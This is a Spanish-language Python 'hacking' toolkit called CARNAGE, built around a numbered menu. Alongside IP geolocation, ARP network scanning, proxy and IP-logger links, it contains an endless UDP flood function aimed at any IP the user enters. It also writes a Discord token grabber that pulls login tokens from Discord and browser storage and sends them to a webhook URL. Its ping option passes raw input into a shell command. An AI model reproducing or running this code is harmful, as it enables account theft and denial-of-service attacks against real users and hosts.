import random
import socket
import os
import webbrowser
import requests
import json
import sys
import time

try:
    import scapy.all as scapy
except:
    os.system("pip install scapy")
    import scapy.all as scapy

from subprocess import PIPE, Popen
from datetime import datetime

from re import VERBOSE
from colorama import Fore
from colorama import Style

clear = lambda: os.system('cls')
clear()

print(f'''{Fore.RED}

         ██████╗ █████╗ ██████╗ ███╗   ██╗ █████╗  ██████╗ ███████╗
        ██╔════╝██╔══██╗██╔══██╗████╗  ██║██╔══██╗██╔════╝ ██╔════╝
        ██║     ███████║██████╔╝██╔██╗ ██║███████║██║  ███╗█████╗  
        ██║     ██╔══██║██╔══██╗██║╚██╗██║██╔══██║██║   ██║██╔══╝  
        ╚██████╗██║  ██║██║  ██║██║ ╚████║██║  ██║╚██████╔╝███████╗
         ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝      

                    Creado por TeoUwUxd | Versión v0.3

        
        [ 1 ] Generar IPv4 Falsa
        [ 2 ] IPLoggers
        [ 3 ] Geolocalizar IP
        [ 4 ] Escanear la red wifi
        [ 5 ] Listas de proxies
        [ 6 ] Conectarse a un proxy
        [ 7 ] Pingear
        [ 8 ] Generar perfil falso
        [ 9 ] Hacer ataque Dos
        [ 10 ] Discord Token Grabber

        [ 99 ] Cerrar la terminal

''')

opcion = int(input(f"  [~] Elije una opción: {Fore.RESET}"))

def FALSA_IP():
    print("")

    gen_ip_num = int(input(f"{Fore.RED}  [~] Cuántas IPv4 falsas quieres generar?: {Fore.RESET}"))
    print("")

    def main():
        
        ip = "192.168."
        ip += ".".join(map(str, (random.randint(0, 255) 
                        for _ in range(2))))
                        
        print(f"{Fore.GREEN}  [+] IPv4 falsa generada correctamente: {Style.RESET_ALL}" + ip)
        print("")

    try:
        for i in range(gen_ip_num):
            if __name__ == '__main__':
                main()

    except:
        print(f"{Fore.RED}  [-] No se han podido generar las ipv4 falsas! {Style.RESET_ALL}")
        print("")

def IPLOGGER():
    clear()
    print(f'''{Fore.RED}

         ██████╗ █████╗ ██████╗ ███╗   ██╗ █████╗  ██████╗ ███████╗
        ██╔════╝██╔══██╗██╔══██╗████╗  ██║██╔══██╗██╔════╝ ██╔════╝
        ██║     ███████║██████╔╝██╔██╗ ██║███████║██║  ███╗█████╗  
        ██║     ██╔══██║██╔══██╗██║╚██╗██║██╔══██║██║   ██║██╔══╝  
        ╚██████╗██║  ██║██║  ██║██║ ╚████║██║  ██║╚██████╔╝███████╗
         ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝                  

                    Creado por TeoUwUxd | Versión v0.3


        [ 1 ] IPLogger.org
        [ 2 ] Grabify

        [ 00 ] Volver al menú principal
        [ 99 ] Salir

    ''')

    opcionIPL = int(input(f"  [~] Elije una opción: {Fore.RESET}"))

    def IPLogger():
        try:
            url = ['https://iplogger.org/']

            webbrowser.register('chrome',None,webbrowser.BackgroundBrowser("C://Program Files//Google//Chrome//Application//chrome.exe"))

            h = webbrowser.get('chrome')
            h.open(url[0])

            print(f"{Fore.GREEN}\n  [+] La página web se ha podido abrir correctamente! {Style.RESET_ALL}")
        
        except:
            print(f"{Fore.RED}\n  [-] Ha ocurrido un error y no se ha podido abrir la página web correctamente! {Style.RESET_ALL}")
            print("")

    def Grabify():
        try:
            url = ['https://grabify.link/']

            webbrowser.register('chrome',None,webbrowser.BackgroundBrowser("C://Program Files//Google//Chrome//Application//chrome.exe"))

            h = webbrowser.get('chrome')
            h.open(url[0])

            print(f"{Fore.GREEN}\n  [+] La página web se ha podido abrir correctamente! {Style.RESET_ALL}")

        except:
            print(f"{Fore.RED}\n  [-] Ha ocurrido un error y no se ha podido abrir la página web correctamente! {Style.RESET_ALL}")
            print("")

    
    if opcionIPL == 1:
        IPLogger()
    
    elif opcionIPL == 2:
        Grabify()

    elif opcionIPL == 00:
        os.system("python carnage.py")
        exit()

    elif opcionIPL == 99:
        print(f"{Style.RESET_ALL} ")
        exit()

def GEOIP():
    clear()
    print(f'''{Fore.RED}

         ██████╗ █████╗ ██████╗ ███╗   ██╗ █████╗  ██████╗ ███████╗
        ██╔════╝██╔══██╗██╔══██╗████╗  ██║██╔══██╗██╔════╝ ██╔════╝
        ██║     ███████║██████╔╝██╔██╗ ██║███████║██║  ███╗█████╗  
        ██║     ██╔══██║██╔══██╗██║╚██╗██║██╔══██║██║   ██║██╔══╝  
        ╚██████╗██║  ██║██║  ██║██║ ╚████║██║  ██║╚██████╔╝███████╗
         ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝                  

                    Creado por TeoUwUxd | Versión v0.3


        [ 1 ] Geolocalizar IP
        [ 2 ] Reverse DNS IP

        [ 00 ] Volver al menú principal
        [ 99 ] Salir

    ''')

    opcionGIP = int(input(f"  [~] Elije una opción: {Fore.RESET}"))

    if opcionGIP == 1:
        print(f"{Fore.YELLOW}\n  [!] La geolocalización no es 100% exacta (98.8470496442%)")
        ipaddres = str(input(f"{Fore.RED}\n  [~] IP: {Style.RESET_ALL}"))
        iprequest = requests.get(f"http://ip-api.com/json/{ipaddres}")
        if iprequest.status_code == 200:
            ipdata = json.loads(iprequest.text)
            if ipdata["status"] == "success":
                print(f"{Fore.RED}\n      País: {Fore.RESET}", ipdata["country"], ipdata["countryCode"])
                print(f"{Fore.RED}      Región: {Fore.RESET}", ipdata["region"], ipdata["regionName"])
                print(f"{Fore.RED}      Ciudad: {Fore.RESET}", ipdata["city"])
                print(f"{Fore.RED}      Zip: {Fore.RESET}", ipdata["zip"])
                lat = ipdata["lat"]
                lon = ipdata["lon"]
                print(f"{Fore.RED}      Localización: {Fore.RESET}", lat, f"{Fore.RED},{Fore.RESET}", lon)

                maps = f"https://www.google.com/maps/@{lat},{lon},9z?hl=id"
                print(f"{Fore.RED}      Google Maps: {Fore.RESET}", maps)

                print(f"{Fore.RED}      Timezone: {Fore.RESET}", ipdata["timezone"])
                print(f"{Fore.RED}      ISP: {Fore.RESET}", ipdata["isp"])
                print(f"{Fore.RED}      Dirección IP: {Fore.RESET}", ipdata["query"])

                print(f"{Fore.GREEN}\n  [+] Información conseguida correctamente!")

            else:
                print(f"{Fore.RED}\n  [-] No se ha podido conseguir la información correctamente!")
        else:
            print(f"{Fore.RED}\n  [-] No se ha podido conseguir la información correctamente!")


    elif opcionGIP == 2:

        ipgipdns = str(input(f"{Fore.RED}\n  [~] IP: {Fore.RESET}"))
        try:
            domain_name = socket.gethostbyaddr(ipgipdns)[0]

            print(f"{Fore.RED}\n      Reverse DNS IP: {Fore.RESET}" + domain_name)
            print("")
            print(f"{Fore.GREEN}  [+] Reverse DNS IP conseguida correctamente! {Style.RESET_ALL}")

        except:
            print(f"{Fore.RED}  [-] No se ha podido conseguir la Reverse DNS IP correctamente! {Style.RESET_ALL}")

    elif opcionGIP == 00:
        os.system("python carnage.py")
        exit()

    elif opcionGIP == 99:
        print(f"{Style.RESET_ALL}")
        exit()

def SCAN():
    print(" ")
    request = scapy.ARP()
    request.pdst = str(input(f"{Fore.RED}  [~] Por favor, inserta la ip y el rango que quieras escanear (ejemplo: 192.168.150.75/24): {Fore.RESET}"))
    broadcast = scapy.Ether()
    broadcast.dst = 'ff:ff:ff:ff:ff:ff'
    request_broadcast = broadcast/request
    clients = scapy.srp(request_broadcast, timeout = 3,verbose=0)[0]
    print(f"{Fore.RED}\n          IP:"+" "*30 +"MAC:")
    for sent,received in clients:
        print("      " + f"{Fore.WHITE}{received.psrc}"+" "*18+f"{received.hwdst}")

def L_PROXIES():
    clear()
    print(f'''{Fore.RED}

         ██████╗ █████╗ ██████╗ ███╗   ██╗ █████╗  ██████╗ ███████╗
        ██╔════╝██╔══██╗██╔══██╗████╗  ██║██╔══██╗██╔════╝ ██╔════╝
        ██║     ███████║██████╔╝██╔██╗ ██║███████║██║  ███╗█████╗  
        ██║     ██╔══██║██╔══██╗██║╚██╗██║██╔══██║██║   ██║██╔══╝  
        ╚██████╗██║  ██║██║  ██║██║ ╚████║██║  ██║╚██████╔╝███████╗
         ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝                  

                    Creado por TeoUwUxd | Versión v0.3


        [ 1 ] Free-Proxy-List

        [ 00 ] Volver al menú principal
        [ 99 ] Salir

    ''')

    opcionLPRO = int(input(f"{Fore.RED}  [~] Elije una opción: {Fore.RESET}"))

    def FREE_PROXY_LIST():
        try:
            url = ['https://free-proxy-list.net/']

            webbrowser.register('chrome',None,webbrowser.BackgroundBrowser("C://Program Files//Google//Chrome//Application//chrome.exe"))

            h = webbrowser.get('chrome')
            h.open(url[0])

            print(f"{Fore.GREEN}\n  [+] La página web se ha podido abrir correctamente! {Style.RESET_ALL}")

        except:
            print(f"{Fore.RED}\n  [-] Ha ocurrido un error y no se ha podido abrir la página web correctamente! {Style.RESET_ALL}")
            print("")

    if opcionLPRO == 1:
        FREE_PROXY_LIST()

    elif opcionLPRO == 00:
        os.system("python carnage.py")
        exit()

    elif opcionLPRO == 99:
        print(f"{Style.RESET_ALL} ")
        exit()

def VPN():
    print(f"{Fore.YELLOW}\n  [!] Esta conexión proxy puede no ser 100% estable! Esto puede depender de muchos factores.")
    ip = str(input(f'{Fore.RED}\n  [~] Introduce un proxy con el puerto (ejemplo: 191.242.178.209:3128): {Fore.RESET}'))

    proxies = {
        'https': 'https://' + ip
    }

    try:
        response = requests.get("https://ipinfo.io/json", proxies=proxies)
        print(f"{Fore.GREEN}\n [+] Se ha conectado correctamente! {Fore.RED}")
        print(response.text)

    except:
        print(f"{Fore.RED}\n  [-] No se ha podido conectar correctamente!")

def PING():
    ip = input(f"{Fore.RED}\n  [~] IP: {Fore.RESET}")
    num = input(f"{Fore.RED}\n  [~] Número de pings: {Fore.RESET}")
    print(f"{Fore.RED}")

    def cmdline(command):
        process = Popen(
            args=command,
            stdout=PIPE,
            shell=True
        )
        return process.communicate()[0]

    print(cmdline(f"ping -n {num} {ip}"))
    print("-" * 168)
    print(" ")

def FAKE_INFO():
    try:
        url = ['https://www.fakenamegenerator.com/gen-random-sp-sp.php']

        webbrowser.register('chrome',None,webbrowser.BackgroundBrowser("C://Program Files//Google//Chrome//Application//chrome.exe"))

        h = webbrowser.get('chrome')
        h.open(url[0])

        print(f"{Fore.GREEN}\n  [+] La página web se ha podido abrir correctamente! {Style.RESET_ALL}\n")
        
    except:
        print(f"{Fore.RED}\n  [-] Ha ocurrido un error y no se ha podido abrir la página web correctamente! {Style.RESET_ALL}\n")

def DOS():
    now = datetime.now()
    hour = now.hour
    minute = now.minute
    day = now.day
    month = now.month
    year = now.year

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1490)

    ip = str(input(f"{Fore.RED}\n  [~] IP: {Fore.RESET}"))
    port = int(input(f"{Fore.RED}\n  [~] Puerto (53, 65, 80, 8080, etc.): {Fore.RESET}"))

    print(f"{Fore.GREEN}\n     [+]--                                                                               [+] 0%")
    time.sleep(2)
    print("     [+]-xxxxxxxxxxxxxxxxxxxxxx>                                                         [+] 25%")
    time.sleep(2)
    print("     [+]-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx>                                     [+] 50%")
    time.sleep(2)
    print("     [+]-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx>                     [+] 75%")
    time.sleep(2)
    print("     [+]-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx>[+] 100%")
    time.sleep(2)
    sent = 0
    while True:
        sock.sendto(bytes, (str(ip),int(port)))
        sent = sent + 1
        port = port + 1
        print(f"{Fore.GREEN}\n  [+] Enviado el paquete {sent} a {ip} a través del puerto {port}")
        if port == 65534:
            port = port - 1

def DISC_TOKEN():

    print(f"{Fore.YELLOW}\n  [!] En la misma carpeta donde se encuentra este script, se creará un scrip llamado Discord_token_grabber_CARNAGE.py.\n      Si este ya existe, será remplazado!")
    weebhook = input(f"{Fore.RED}\n  [~] Inserta la WEEBHOOK: {Fore.RESET}")
    ping = input(f"{Fore.RED}\n  [~] Deseas ser pingueado? (s/n): {Fore.RESET}")

    if ping == "s":
        PING = "True"

    elif ping == "n":
        PING = "False"

    elif ping != "s":
        if ping != "n":
            print(f"{Fore.RED}\n  [-] No se ha contestado correctamente! ")
            exit()

    file = open("Discord_token_grabber_CARNAGE.py","w")
    file.write(f'''
import os
import re
import json

from urllib.request import Request, urlopen

# your webhook URL
WEBHOOK_URL = '{weebhook}'

# mentions you when you get a hit
PING_ME = {PING}

    ''' + '''
def find_tokens(path):
    path += '\\Local Storage\\leveldb'

    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens

def main():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')

    paths = {
        "Discord"           : roaming + "\\Discord",
        "Discord Canary"    : roaming + "\\discordcanary",
        "Discord PTB"       : roaming + "\\discordptb",
        "Google Chrome"     : local + "\\Google\\Chrome\\User Data\\Default",
        "Opera"             : roaming + "\\Opera Software\\Opera Stable",
        "Brave"             : local + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
        "Yandex"            : local + "\\Yandex\\YandexBrowser\\User Data\\Default"
    }

    message = '@everyone' if PING_ME else ''

    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        message += f'**{platform}**```'

        tokens = find_tokens(path)

        if len(tokens) > 0:
            for token in tokens:
                message += f'{token}'
        else:
            message += 'No tokens found.'

        message += '```'

    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
    }

    payload = json.dumps({'content': message})

    try:
        req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
        urlopen(req)
    except:
        pass

if __name__ == '__main__':
    main()

     ''')
    file.close

    print(f"{Fore.GREEN}\n  [+] Se ha creado el nuevo Discord Toker Grabber correctamente!")


if opcion == 1:
    FALSA_IP()

elif opcion == 2:
    IPLOGGER()

elif opcion == 3:
    GEOIP()

elif opcion == 4:
    SCAN()

elif opcion == 5:
    L_PROXIES()

elif opcion == 6:
    VPN()

elif opcion == 7:
    PING()

elif opcion == 8:
    FAKE_INFO()

elif opcion == 9:
    DOS()

elif opcion == 10:
    DISC_TOKEN()

elif opcion == 99:
    print(f"{Style.RESET_ALL}")
    exit()


